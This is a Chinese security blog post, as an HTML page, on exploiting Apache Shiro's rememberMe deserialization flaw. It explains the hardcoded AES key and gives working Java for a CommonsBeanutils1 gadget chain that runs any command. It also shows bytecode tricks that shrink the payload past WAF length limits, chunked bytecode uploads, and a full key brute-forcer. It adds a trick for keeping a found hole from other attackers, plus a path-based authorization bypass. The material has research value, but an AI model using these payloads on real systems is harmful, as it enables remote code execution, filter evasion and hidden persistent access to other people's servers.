@@ -1,0 +1,742 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>shiro 理解以及payload限制长度 | pyroxenite</title>
+<meta name="description" content="温故而知新">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://pyroxenites.github.io/favicon.ico?v=1685337865502">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://pyroxenites.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="https://pyroxenites.github.io">
+        <img class="avatar" src="https://pyroxenites.github.io/images/avatar.png?v=1685337865502" alt="" width="32px" height="32px">
+      </a>
+      <a href="https://pyroxenites.github.io">
+        <h1 class="site-title">pyroxenite</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="/" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">shiro 理解以及payload限制长度</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2022-04-12</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="https://pyroxenites.github.io/tag/T5QnKuhLq/">
+                    漏洞研究
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content" v-pre>
+            <h1 id="shiro反序列化">shiro反序列化</h1>
+<h2 id="原理">原理</h2>
+<blockquote>
+<p>版本1.2.4</p>
+</blockquote>
+<h3 id="下载环境">下载环境</h3>
+<pre><code class="language-go">git clone https://github.com/apache/shiro.git  
+cd shiro
+git checkout shiro-root-1.2.4
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://pyroxenites.github.io/post-images/1647137327102-cfd3772a-98f1-4899-964f-2d32c7108fa7.png" alt="image.png" loading="lazy"></figure>
+<h3 id="官方解释">官方解释</h3>
+<p><a href="https://issues.apache.org/jira/browse/SHIRO-550">https://issues.apache.org/jira/browse/SHIRO-550</a></p>
+<p><img src="https://pyroxenites.github.io/post-images/1647137435714-4fe79944-ebba-4baa-8518-3022339135ac.png" alt="image.png" loading="lazy"><br>
+在默认情况下Shiro会使用CookieRememberMeManager功能，当后端接收到来自未经身份验证的用户的请求时，它将通过执行以下操作来寻找他们记住的身份：</p>
+<ol>
+<li>检索cookie中RememberMe的值</li>
+<li>Base64解码</li>
+<li>使用AES解密</li>
+<li>反序列化</li>
+</ol>
+<blockquote>
+<p>由于AES加解密的秘钥被硬编码在代码中，这意味着有权访问源代码的任何人都知道默认加密密钥是什么，因此，攻击者可以创建一个恶意对象并对其进行序列化，编码，然后将其作为cookie发送，然后Shiro将解码并反序列化，从而导致恶意代码执行</p>
+</blockquote>
+<hr>
+<h3 id="分析">分析</h3>
+<h4 id="解密过程">解密过程</h4>
+<ol>
+<li>在CookieRememberMeManager类中读取cookie跟踪</li>
+</ol>
+<figure data-type="image" tabindex="2"><img src="https://pyroxenites.github.io/post-images/1647150687590-ce0a3941-c134-4ad8-8dfd-c7f670c1c3ec.png" alt="image.png" loading="lazy"></figure>
+<ol start="2">
+<li>进入readValue()方法,将cookie中的remember字段值赋予value并返回</li>
+</ol>
+<figure data-type="image" tabindex="3"><img src="https://pyroxenites.github.io/post-images/1647150749670-4995f346-30dd-40ba-891f-50d7040fcf90.png" alt="image.png" loading="lazy"></figure>
+<ol start="3">
+<li>对数据进行base64解码</li>
+</ol>
+<figure data-type="image" tabindex="4"><img src="https://pyroxenites.github.io/post-images/1647150819768-9c309e0e-3494-44c3-b895-642f87d5d090.png" alt="image.png" loading="lazy"></figure>
+<ol start="4">
+<li>进入 AbstractRememberMeManager类中的convertBytesToPrincipals <strong>方法</strong> shiro拿到cookie后的关键代码,先decrypt再反序列化</li>
+</ol>
+<figure data-type="image" tabindex="5"><img src="https://pyroxenites.github.io/post-images/1647150998355-7ded709e-7516-4b93-9e19-40eebfc6f14f.png" alt="image.png" loading="lazy"></figure>
+<ol start="5">
+<li>跟到decrypt方法</li>
+</ol>
+<figure data-type="image" tabindex="6"><img src="https://pyroxenites.github.io/post-images/1647151076598-fe9e24c1-02e2-4b04-aab7-b8eea7fe0d05.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>在getCipherService方法中,获取到加密方法:AES/CBC/PKCS5Padding</p>
+</blockquote>
+<blockquote>
+<p>调用具体的cipherService,传入加密后的数据和cipherKey进行解密<br>
+getDeryptionCipherKey()获取的值也就是这个默认key,硬编码在程序中<br>
+经过base64硬编码的秘钥，因为 AES 是对称加密，即加密密钥也同样是解密密钥</p>
+</blockquote>
+<figure data-type="image" tabindex="7"><img src="https://pyroxenites.github.io/post-images/1647137759957-9fa2f7e9-36d8-499c-9ad0-0560860d44ac.png" alt="image.png" loading="lazy"></figure>
+<ol start="6">
+<li>继续查看decrypt方法,通过cipherService的decrypt来解密数据,跟进后进入JcaCipherService类中的decrypt方法</li>
+</ol>
+<p><img src="https://pyroxenites.github.io/post-images/1647151530340-3dd3d58e-1ae0-431f-a81f-f5aa2d740679.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1647151544112-3e4b54f1-36b3-4f8c-8907-6ceac99b0d3b.png" alt="image.png" loading="lazy"></p>
+<ol start="7">
+<li>继续跟进decrypt方法,完成解密后,返回解密后的数据</li>
+</ol>
+<figure data-type="image" tabindex="8"><img src="https://pyroxenites.github.io/post-images/1647151607803-0993fbc4-3e9f-4469-bb07-4b97a8406ef2.png" alt="image.png" loading="lazy"></figure>
+<ol start="8">
+<li>此时回到AbstractRememberMeManager类中的decrypt方法,可以查看到序列化数据</li>
+</ol>
+<figure data-type="image" tabindex="9"><img src="https://pyroxenites.github.io/post-images/1647151681340-a4e9dbcd-97e1-40d3-908e-817abd62b134.png" alt="image.png" loading="lazy"></figure>
+<ol start="9">
+<li>此时再进入deserialize方法,并进入跟进</li>
+</ol>
+<p><img src="https://pyroxenites.github.io/post-images/1647151768344-20b226b6-3d19-4dd4-8f27-0f0877fc55b6.png" alt="image.png" loading="lazy"><br>
+<img src="https://pyroxenites.github.io/post-images/1647151788650-542cd13a-84eb-4d1d-8d20-51ff4a00d6c0.png" alt="image.png" loading="lazy"></p>
+<ol start="10">
+<li>此时进入到DefaultSerializer类中的deserialize方法,出现了readobject()</li>
+</ol>
+<figure data-type="image" tabindex="10"><img src="https://pyroxenites.github.io/post-images/1647151974730-17f5c4a4-b113-4c41-9beb-5569803daad2.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>Shiro是默认依赖Commons-Beanutils1.8.3的，那么就可以利用CommonsBeanutils1反序列化链进行构造payload</p>
+</blockquote>
+<figure data-type="image" tabindex="11"><img src="https://pyroxenites.github.io/post-images/1647152489567-dce49996-2dd5-4deb-807b-ed65ccd3ea37.png" alt="image.png" loading="lazy"></figure>
+<blockquote>
+<p>一般在登陆状态,会先判断以下JSESSIONID的值,如果修改rememberMe以后没有作用,可以删除一下JSESSIONID</p>
+</blockquote>
+<h2 id="payload需要缩小背景">payload需要缩小背景</h2>
+<p>WAF会对rememberMe长度进行限制,甚至解密payload检查反序列化class</p>
+<blockquote>
+<p>以CommonsBeanutils1链为例</p>
+<ul>
+<li>序列化数据本身缩小</li>
+<li>针对TemplatesImpl中的_bytecodes字节码缩小</li>
+<li>对于执行的代码如何缩小(STATIC代码块)</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>将ysoserial生产的payload缩小</p>
+</blockquote>
+<p><strong><em>缩小前展示</em></strong><br>
+<strong><em>用ysoserial生成CB1链,并进行base64</em></strong></p>
+<blockquote>
+<p>https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar<br>
+mvn clean package -DskipTests</p>
+</blockquote>
+<figure data-type="image" tabindex="12"><img src="https://pyroxenites.github.io/post-images/1647134816639-9d3e6a29-91b9-4730-8c5e-2797a1c22fe6.png" alt="image.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="13"><img src="https://pyroxenites.github.io/post-images/1647134896952-7cdc9d2a-54e2-4516-a8c1-af40fd8cf77f.png" alt="image.png" loading="lazy"></figure>
+<p>长度为3872</p>
+<h2 id="方法">方法</h2>
+<h3 id="尝试自己构造gadget">尝试自己构造Gadget</h3>
+<p>依赖</p>
+<pre><code class="language-go">&lt;dependency&gt;
+    &lt;groupId&gt;commons-beanutils&lt;/groupId&gt;
+    &lt;artifactId&gt;commons-beanutils&lt;/artifactId&gt;
+    &lt;version&gt;1.9.2&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>构造代码</p>
+<pre><code class="language-java">public static byte[] getPayloadUseByteCodes(byte[] byteCodes) {
+    try {
+        TemplatesImpl templates = new TemplatesImpl();
+        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][]{byteCodes});
+        setFieldValue(templates, &quot;_name&quot;, &quot;HelloTemplatesImpl&quot;);
+        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
+        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);
+        queue.add(&quot;1&quot;);
+        queue.add(&quot;1&quot;);
+        setFieldValue(comparator, &quot;property&quot;, &quot;outputProperties&quot;);
+        setFieldValue(queue, &quot;queue&quot;, new Object[]{templates, templates});
+        return serialize(queue);
+    } catch (Exception e) {
+        e.printStackTrace();
+    }
+    return new byte[]{};
+}
+</code></pre>
+<p>恶意类</p>
+<pre><code class="language-java">public class EvilByteCodes extends AbstractTranslet {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
+
+    }
+}
+</code></pre>
+<p>读取字节码并设置到Gadget中，序列化后统计长度：<strong>2728</strong></p>
+<pre><code class="language-java">byte[] evilBytesCode = Files.readAllBytes(Paths.get(&quot;/path/to/EvilByteCodes.class&quot;));
+byte[] my = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(evilBytesCode));
+System.out.println(new String(my).length());
+</code></pre>
+<p>还有三处可以优化：</p>
+<ul>
+<li>设置_name名称可以是一个字符</li>
+<li>其中_tfactory属性可以删除（分析TemplatesImpl得出）</li>
+<li>其中EvilByteCodes类捕获异常后无需处理</li>
+</ul>
+<pre><code class="language-java">setFieldValue(templates, &quot;_name&quot;, &quot;t&quot;);
+// setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());
+
+try {
+    Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+} catch (Exception ignored) {
+}
+</code></pre>
+<p>经过这三处优化后得到长度：<strong>2608</strong></p>
+<h3 id="从字节码层面进行优化">从字节码层面进行优化</h3>
+<p>上文中的EvilBytesCode恶意类的字节码是可以缩减的<br>
+对字节码进行分析：javap -c -l EvilByteCodes.class</p>
+<pre><code class="language-java">public class org.sec.payload.EvilByteCodes extends com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet {
+  // transform 1 
+  // transform 2
+  // &lt;init&gt;
+  // &lt;clint&gt;
+  static {};
+    Code:
+       0: invokestatic  #2                  // Method java/lang/Runtime.getRuntime:()Ljava/lang/Runtime;
+       3: ldc           #3                  // String
+       5: invokevirtual #4                  // Method java/lang/Runtime.exec:(Ljava/lang/String;)Ljava/lang/Process;
+       8: pop
+       9: goto          13
+      12: astore_0
+      13: return
+    Exception table:
+       from    to  target type
+           0     9    12   Class java/lang/Exception
+    LineNumberTable:
+      line 11: 0
+      line 13: 9
+      line 12: 12
+      line 14: 13
+    LocalVariableTable:
+      Start  Length  Slot  Name   Signature
+}
+</code></pre>
+<p>可以看出，该类每个方法包含了三部分：</p>
+<ul>
+<li>代码对应的字节码</li>
+<li>ExceptionTable和LocalVariableTable</li>
+<li>LineNumberTable</li>
+</ul>
+<p>从JVM相关的知识可以得知，局部变量表和异常表是不能删除的，否则无法执行<br>
+但LineNumberTable是可以删除的<br>
+换句话来说：LINENUMBER指令可以全部删了<br>
+于是基于ASM实现删除LINENUMBER</p>
+<pre><code class="language-java">byte[] bytes = Files.readAllBytes(Paths.get(path));
+ClassReader cr = new ClassReader(bytes);
+ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_FRAMES);
+int api = Opcodes.ASM9;
+ClassVisitor cv = new ShortClassVisitor(api, cw);
+int parsingOptions = ClassReader.SKIP_DEBUG | ClassReader.SKIP_FRAMES;
+cr.accept(cv, parsingOptions);
+byte[] out = cw.toByteArray();
+Files.write(Paths.get(path), out);
+</code></pre>
+<p>ShortClassVisitor</p>
+<pre><code class="language-java">public class ShortClassVisitor extends ClassVisitor {
+    private final int api;
+
+    public ShortClassVisitor(int api, ClassVisitor classVisitor) {
+        super(api, classVisitor);
+        this.api = api;
+    }
+
+    @Override
+    public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
+        MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+        return new ShortMethodAdapter(this.api, mv);
+    }
+}
+</code></pre>
+<p>重点在于ShortMethodAdapter：如果遇到LINENUMBER指令则<strong>阻止传递</strong>，可以理解为返回空</p>
+<pre><code class="language-java">public class ShortMethodAdapter extends MethodVisitor implements Opcodes {
+
+    public ShortMethodAdapter(int api, MethodVisitor methodVisitor) {
+        super(api, methodVisitor);
+    }
+
+    @Override
+    public void visitLineNumber(int line, Label start) {
+        // delete line number
+    }
+}
+</code></pre>
+<p>读取编译的字节码并处理后替换</p>
+<pre><code class="language-java">Resolver.resolve(&quot;/path/to/EvilByteCodes.class&quot;);
+byte[] newByteCodes = Files.readAllBytes(Paths.get(&quot;/path/to/EvilByteCodes.class&quot;));
+byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
+System.out.println(new String(payload).length());
+</code></pre>
+<p>经过优化后得到长度：<strong>1832</strong></p>
+<h3 id="使用javassist构造">使用javassist构造</h3>
+<p>以上代码虽然做到了超过百分之五十的缩小，但存在一个问题：目前的恶意类是写死的，无法动态构造<br>
+想要动态构造字节码一种手段是选择ASM做，但有更好的选择：Javassist<br>
+通过这样的一个方法，就可以根据输入命令动态构造出Evil类</p>
+<pre><code class="language-java">private static byte[] getTemplatesImpl(String cmd) {
+    try {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
+        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);
+        ctClass.setSuperclass(superClass);
+
+        CtConstructor constructor = ctClass.makeClassInitializer();
+        constructor.setBody(&quot;        try {\n&quot; +
+                            &quot;            Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);\n&quot; +
+                            &quot;        } catch (Exception ignored) {\n&quot; +
+                            &quot;        }&quot;);
+
+        CtMethod ctMethod1 = CtMethod.make(&quot;    public void transform(&quot; +
+                                           &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +
+                                           &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) {\n&quot; +
+                                           &quot;    }&quot;, ctClass);
+        ctClass.addMethod(ctMethod1);
+
+        CtMethod ctMethod2 = CtMethod.make(&quot;    public void transform(&quot; +
+                                           &quot;com.sun.org.apache.xalan.internal.xsltc.DOM document, &quot; +
+                                           &quot;com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, &quot; +
+                                           &quot;com.sun.org.apache.xml.internal.serializer.SerializationHandler handler) {\n&quot; +
+                                           &quot;    }&quot;, ctClass);
+        ctClass.addMethod(ctMethod2);
+
+        byte[] bytes = ctClass.toBytecode();
+        ctClass.defrost();
+
+        return bytes;
+    } catch (Exception e) {
+        e.printStackTrace();
+        return new byte[]{};
+    }
+}
+</code></pre>
+<p>将动态生成的字节码保存至当前目录，再读取加载</p>
+<pre><code class="language-java">String path = System.getProperty(&quot;user.dir&quot;) + File.separator + &quot;Evil.class&quot;;
+Generator.saveTemplateImpl(path, &quot;calc.exe&quot;);
+byte[] newByteCodes = Files.readAllBytes(Paths.get(&quot;Evil.class&quot;));
+byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
+System.out.println(new String(payload).length());
+</code></pre>
+<p>经过优化后得到长度：1848</p>
+<p>不难发现使用Javassist生成的字节码似乎本身就不包含LINENUMBER指令<br>
+不过这只是猜测，当使用上文的删除指令代码优化后，发现进一步缩小了</p>
+<pre><code class="language-java">...
+Generator.saveTemplateImpl(path, &quot;calc.exe&quot;);
+Resolver.resolve(&quot;Evil.class&quot;);
+...
+// 验证Payload是否有效    
+Payload.deserialize(Base64.getDecoder().decode(payload));
+</code></pre>
+<p>经过优化后得到长度：<strong>1804</strong></p>
+<h3 id="删除重写方法">删除重写方法</h3>
+<p>可以发现Evil类继承自AbstractTranslet抽象类，所以必须重写两个transform方法<br>
+这样写代码会导致编译不通过，无法执行</p>
+<pre><code class="language-java">public class EvilByteCodes extends AbstractTranslet {
+    static {
+        try {
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (Exception ignored) {
+        }
+    }
+}
+</code></pre>
+<p>编译不通过不代表非法，通过手段直接构造对应的字节码</p>
+<ol>
+<li>通过ASM删除方法</li>
+</ol>
+<pre><code class="language-java">@Override
+public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
+    if (name.equals(&quot;transform&quot;)) {
+        return null;
+    }
+    MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+    return new ShortMethodAdapter(this.api, mv, name);
+}
+</code></pre>
+<ol start="2">
+<li>通过Javassist直接构造</li>
+</ol>
+<pre><code class="language-java">private static byte[] getTemplatesImpl(String cmd) {
+    try {
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
+        CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);
+        ctClass.setSuperclass(superClass);
+        CtConstructor constructor = ctClass.makeClassInitializer();
+        constructor.setBody(&quot;        try {\n&quot; +
+                            &quot;            Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);\n&quot; +
+                            &quot;        } catch (Exception ignored) {\n&quot; +
+                            &quot;        }&quot;);
+        byte[] bytes = ctClass.toBytecode();
+        ctClass.defrost();
+        return bytes;
+    } catch (Exception e) {
+        e.printStackTrace();
+        return new byte[]{};
+    }
+}
+</code></pre>
+<p>通过以上手段处理后进行反序列化验证：成功弹出计算器</p>
+<pre><code class="language-java">String path = System.getProperty(&quot;user.dir&quot;) + File.separator + &quot;Evil.class&quot;;
+Generator.saveTemplateImpl(path, &quot;calc.exe&quot;);
+Resolver.resolve(&quot;Evil.class&quot;);
+byte[] newByteCodes = Files.readAllBytes(Paths.get(&quot;Evil.class&quot;));
+byte[] payload = Base64.getEncoder().encode(CB1.getPayloadUseByteCodes(newByteCodes));
+System.out.println(new String(payload).length());
+Payload.deserialize(Base64.getDecoder().decode(payload));
+</code></pre>
+<p>最终优化后得到长度：<strong>1332</strong><br>
+并不是所有方法都能删除，比如不存在构造方法的情况下无法删除空参构造<br>
+于是有了一个新思路：删除静态代码块，将代码写入空参构造</p>
+<pre><code class="language-java">ClassPool pool = ClassPool.getDefault();
+CtClass ctClass = pool.makeClass(&quot;Evil&quot;);
+CtClass superClass = pool.get(&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;);
+ctClass.setSuperclass(superClass);
+CtConstructor constructor = CtNewConstructor.make(&quot;    public Evil(){\n&quot; +
+                                                  &quot;        try {\n&quot; +
+                                                  &quot;            Runtime.getRuntime().exec(\&quot;&quot; + cmd + &quot;\&quot;);\n&quot; +
+                                                  &quot;        }catch (Exception ignored){}\n&quot; +
+                                                  &quot;    }&quot;, ctClass);
+ctClass.addConstructor(constructor);
+byte[] bytes = ctClass.toBytecode();
+ctClass.defrost();
+return bytes;
+</code></pre>
+<p>最终优化后得到长度：<strong>1296</strong></p>
+<h3 id="分块传输">分块传输</h3>
+<p>以上的内容都在围绕字节码和序列化数据的缩小，已经做到的<strong>接近极致</strong>，很难做到更小的<br>
+对于STATIC代码块中需要执行的代码也有缩小手段，这也是更有实战意义是思考，因为实战中不是弹个计算器这么简单<br>
+因此可以用追加的方式发送多个请求往指定文件中写入字节码，将真正需要执行的字节码分块<br>
+使用Javassist动态生成写入每一分块的Payload，以追加的方式将所有字节码的Base64写入某文件</p>
+<pre><code class="language-java">static {
+    try {
+        String path = &quot;/your/path&quot;;
+        // 创建文件
+        File file = new File(path);
+        file.createNewFile();
+        // 传入true是追加方式写文件
+        FileOutputStream fos = new FileOutputStream(path, true);
+        // 需要写入的数据
+        String data = &quot;BASE64_BYTECODES_PART&quot;;
+        fos.write(data.getBytes());
+        fos.close();
+    } catch (Exception ignore) {
+    }
+</code></pre>
+<p>在最后一个包中将字节码进行Base64Decode并写入class文件<br>
+（也可以直接写字节码二进制数据，不过认为Base64好分割处理一些）</p>
+<pre><code class="language-java">static {
+    try {
+        String path = &quot;/your/path&quot;;
+        FileInputStream fis = new FileInputStream(path);
+        // size取决于实际情况
+        byte[] data = new byte[size];
+        fis.read(data);
+        // 写入Evil.class
+        FileOutputStream fos = new FileOutputStream(&quot;Evil.class&quot;);
+        fos.write(Base64.getDecoder().decode(data));
+        fos.close();
+    } catch (Exception ignored) {
+    }
+}
+</code></pre>
+<h3 id="工具">工具</h3>
+<p><a href="https://github.com/4ra1n/ShortPayload">payload缩小工具</a></p>
+<h2 id="其他问题">其他问题</h2>
+<h3 id="怎样检测目标框架中使用了shiro">怎样检测目标框架中使用了shiro</h3>
+<p>直接查看请求响应中是否由**<em>rememberMe=deleteMe</em>**这样的Cookie</p>
+<h3 id="最新版shiro还存在反序列化漏洞吗">最新版shiro还存在反序列化漏洞吗</h3>
+<p>存在,只要密钥是常见的,还是有反序列化漏洞的可能性的</p>
+<h3 id="shiro反序列化怎么检测key的">shiro反序列化怎么检测key的</h3>
+<p>实例化一个SimplePrincipalCollection并序列化,遍历key列表对该序列化数据进行AES加密<br>
+<img src="https://pyroxenites.github.io/post-images/1646290061088-dc6a0af9-6448-4fd3-a334-432defdf7a15.png" alt="image.png" loading="lazy"></p>
+<pre><code class="language-java">SimplePrincipalCollection sc = new SimplePrincipalCollection();
+byte[] scBytes = Payload.serialize(sc);
+
+
+byte[] keyBytes = Base64.decode(key);
+CipherService cipherService = new AesCipherService();
+ByteSource byteSource = cipherService.encrypt(scBytes, keyBytes);
+byte[] value = byteSource.getBytes();
+</code></pre>
+<p>然后加入到Cookie的remberMe字段中发送</p>
+<pre><code class="language-java">String checkKeyCookie = &quot;rememberMe=&quot; + Base64.encodeToString(value);
+Request loginReq = new Request.Builder()
+    .url(url)
+    .addHeader(&quot;Cookie&quot;, &quot;rememberMe=yanmu5525&quot;)
+    .get()
+    .build();
+</code></pre>
+<p>如果相应头的Set-Cookie字段中包含remember=deleteMe说明不是该密钥</p>
+<p>如果什么都不返回,说明当前key是正确的key</p>
+<pre><code class="language-java">if (checkResponse.header(&quot;Set-Cookie&quot;) == null) {
+    shiro = true;
+    logger.info(&quot;find shiro key: &quot; + key);
+}
+</code></pre>
+<p>实际中可能需要多次这样的请求来确认key</p>
+<pre><code class="language-java">package com.github.yanmu;
+
+import okhttp3.Call;
+import okhttp3.OkHttpClient;
+import okhttp3.Request;
+import okhttp3.Response;
+import org.apache.shiro.crypto.AesCipherService;
+import org.apache.shiro.crypto.CipherService;
+import org.apache.shiro.subject.SimplePrincipalCollection;
+import org.apache.shiro.codec.Base64;
+import org.apache.shiro.util.ByteSource;
+import java.io.*;
+import java.util.ArrayList;
+
+@SuppressWarnings(&quot;all&quot;)
+public class Main {
+    public static byte[] serialize(Object o) {
+        try {
+            ByteArrayOutputStream aos = new ByteArrayOutputStream();
+            ObjectOutputStream oos = new ObjectOutputStream(aos);
+            oos.writeObject(o);
+            oos.flush();
+            oos.close();
+            return aos.toByteArray();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return null;
+    }
+    public static String start(OkHttpClient client,String url,String filepath) throws Exception {
+        File file = new File(filepath);
+        BufferedReader bufferedReader = new BufferedReader(new FileReader(file));
+        ArrayList&lt;String&gt; arrayList = new ArrayList&lt;&gt;();
+        String str;
+        while ((str= bufferedReader.readLine())!=null){
+            arrayList.add(str);
+        }
+        bufferedReader.close();
+        for (String key : arrayList) {
+            SimplePrincipalCollection sc = new SimplePrincipalCollection();
+            byte[] scBytes = serialize(sc);
+            byte[] keyBytes = Base64.decode(key);
+            CipherService cipherService = new AesCipherService();
+            ByteSource byteSource = cipherService.encrypt(scBytes, keyBytes);
+            byte[] value = byteSource.getBytes();
+            String checkKeyCookie = &quot;rememberMe=&quot; + Base64.encodeToString(value);
+            Request loginReq = new Request.Builder()
+                .url(url)
+                .addHeader(&quot;Cookie&quot;, &quot;rememberMe=yanmu5525&quot;)
+                .get()
+                .build();
+            Call call = client.newCall(loginReq);
+            Response response = call.execute();
+            String respCookie = response.header(&quot;Set-Cookie&quot;);
+            boolean shiro = false;
+            if (respCookie != null &amp;&amp; !respCookie.equals(&quot;&quot;)) {
+                if (respCookie.contains(&quot;rememberMe=deleteMe&quot;)) {
+                    Request checkReq = new Request.Builder()
+                        .url(url)
+                        .addHeader(&quot;Cookie&quot;, checkKeyCookie)
+                        .get()
+                        .build();
+                    Call checkCall = client.newCall(checkReq);
+                    Response checkResponse = checkCall.execute();
+                    if (checkResponse.header(&quot;Set-Cookie&quot;) == null) {
+                        shiro = true;
+                        System.out.println(&quot;find shiro key: &quot; + key);
+                    }
+                    checkResponse.close();
+                }
+            }
+            response.close();
+            if (shiro) {
+                return key;
+            }
+        }
+        return null;
+    }
+    public static void main(String[] args) throws Exception {
+        OkHttpClient okHttpClient = new OkHttpClient();
+        String start = start(okHttpClient, &quot;http://127.0.0.1:8080/&quot;, &quot;keys.txt&quot;);
+        if (start==null || start.equals(&quot;&quot;)) {
+            System.out.println(&quot;not find key&quot;);
+        }
+    }
+    
+}
+</code></pre>
+<p>发现成功读取到了环境中的key<br>
+<img src="https://pyroxenites.github.io/post-images/1650455173812-ec1f60a5-8f9f-4096-ba74-c561b2d0fa1a.png" alt="image.png" loading="lazy"></p>
+<blockquote>
+<p>代码只做演示</p>
+</blockquote>
+<h3 id="有什么办法让shiro洞被别人挖不到">有什么办法让Shiro洞被别人挖不到</h3>
+<p>发现shiro发序列化漏洞的时候,可以改其中的key,通过已经存在的反序列化可以执行代码<br>
+反射改了RememberMeManager中的key即可</p>
+<blockquote>
+<p>但会导致已登录用户失效,新用户不用影响</p>
+</blockquote>
+<h3 id="shiro反序列化gadget选择有什么坑吗">Shiro反序列化Gadget选择有什么坑吗</h3>
+<ol>
+<li>默认不包含CC链,包含CB1链</li>
+<li>用不同版本的CB1链会导致出错</li>
+</ol>
+<blockquote>
+<p>反序列化时会计算 服务器端反序列化对应类的serialVersionUID 值跟序列化数据里面的 serialVersionUID 值进行比对，如果一样则可以完成反序列化，不一样则会抛出错误，Shiro依赖的版本是Commons-Beanutils1.8.3，所以为了保证serialVersionUID值一样构造payload时也用Commons-Beanutils1.8.3版本</p>
+</blockquote>
+<figure data-type="image" tabindex="14"><img src="https://pyroxenites.github.io/post-images/1647564579540-ceb1d69b-958c-4dba-ab3c-e0c1b56190ac.png" alt="FqRf5kryw8ZlDmM2GDrc-_QM2jd9.png" loading="lazy"></figure>
+<h3 id="shiro权限绕过问题">shiro权限绕过问题</h3>
+<blockquote>
+<p>版本:1.5.3之前<br>
+shiro＋spring</p>
+</blockquote>
+<p>主要是和Spring配合时候的问题<br>
+例如/;/test/admin/page问题<br>
+在Tomcat判断/;test/admin/page为test应用下的/admin/page路由<br>
+进入到Shiro时被;截断被认作为/<br>
+再进入Spring时又被正确处理为test应用下的/admin/page路由<br>
+最后导致shiro的权限绕过</p>
+<p>测试demo</p>
+<pre><code class="language-java">https://github.com/l3yx/springboot-shiro
+</code></pre>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="https://pyroxenites.github.io/post/cc1-lian/">
+              <h3 class="post-title">
